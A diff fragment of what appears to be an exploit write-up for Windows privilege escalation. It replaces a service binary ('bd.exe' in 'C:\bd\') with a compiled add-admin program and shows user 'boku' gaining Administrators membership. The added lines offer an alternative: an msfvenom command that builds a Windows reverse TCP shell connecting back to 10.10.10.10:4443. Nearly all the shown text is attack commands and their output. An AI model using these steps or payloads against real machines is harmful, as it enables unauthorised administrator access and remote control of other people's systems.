@@ -74,6 +74,13 @@ C:\bd>move bd.exe bd.service.exe
 ## Compile Code
    kali# i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o bd.exe
 
+
+# 3 ALTERNATIVE:
+Simply create a revshell.exe and rename it as bd.exe
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
+
+
 #4. Transfer created 'bd.exe' to the Windows Host 
 
 #5. Move the created 'bd.exe' binary to the 'C:\bd\' Folder
@@ -91,3 +98,4 @@ C:\Users\lowpriv>net user boku | findstr /i "Membership Name" | findstr /v "Full
 User name                    boku
 Local Group Memberships      *Administrators       *Users
 Global Group memberships     *None
+
